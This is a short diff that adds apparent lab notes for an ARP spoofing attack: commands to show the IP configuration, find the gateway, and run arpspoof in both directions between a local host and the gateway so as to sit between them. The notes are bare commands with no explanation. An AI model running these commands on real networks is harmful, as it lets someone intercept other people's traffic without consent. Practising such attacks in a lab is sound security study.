@@ -1,0 +1,10 @@
+# Show IP details
+ip a
+
+# Identify gateway
+ip r
+
+# Run arpspoof
+arpspoof -i eth0 -t 192.168.0.105 192.168.0.1
+sudo arpspoof -i eth0 -t 192.168.0.1 192.168.0.105
+
